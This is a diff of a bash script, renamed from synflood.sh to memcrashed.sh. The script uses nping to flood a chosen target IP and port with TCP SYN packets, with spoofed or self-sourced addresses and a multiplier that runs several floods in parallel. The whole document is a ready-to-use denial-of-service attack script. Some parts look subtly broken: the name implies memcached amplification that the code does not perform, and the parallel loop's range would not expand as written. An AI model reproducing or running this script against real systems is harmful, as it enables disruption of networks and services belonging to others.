@@ -8,6 +8,22 @@ else
   echo "Error: Cannot find release file"; exit 1
 fi
 
+target=$1
+port=$2
+mul=$3
+
+flood() {
+  for i in {0..255}; do
+    for j in $i.{0..255}; do
+      for k in $j.{0..255}; do
+        for l in $k.{0..255}; do
+           nping -c 1 --rate 90000 --tcp --flags SYN -S $target -g $port $target
+        done
+      done
+    done
+  done
+}
+
 if [ -z "$(which nping)" ]; then
   echo "nmap not installed; installing"
   case $distro in
@@ -25,22 +41,23 @@ if [ -z "$(which nping)" ]; then
   esac
 else
   if [ -z $1 ]; then
-    echo "Usage: ./synflood.sh TARGET PORT, where \
-    TARGET is the IP address to attack, and \
-    PORT is the port to attack on the target."
+    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
+    TARGET is the IP address to attack, \
+    PORT is the port to attack on the target, \
+    and MULTIPLIER is the number of simultaneous process to run."
   elif [ -z $2 ]; then
-    echo "Usage: ./synflood.sh TARGET PORT, where \
-    TARGET is the IP address to attack, and \
-    PORT is the port to attack on the target"
+    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
+    TARGET is the IP address to attack, \
+    PORT is the port to attack on the target, \
+    and MULTIPLIER is the number of simultaneous process to run."
+  elif [ -z $3 ]; then
+    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
+    TARGET is the IP address to attack, \
+    PORT is the port to attack on the target, \
+    and MULTIPLIER is the number of simultaneous process to run."
   else
-    for i in {0..255}; do
-      for j in $i.{0..255}; do
-        for k in $j.{0..255}; do
-          for l in $k.{0..255}; do
-            nping -c 1 --rate 90000 --tcp --flags SYN -S $l -g $2 $1 &
-          done
-        done
-      done
+    for m in {0..$mul}; do
+      flood &
     done
   fi
 fi
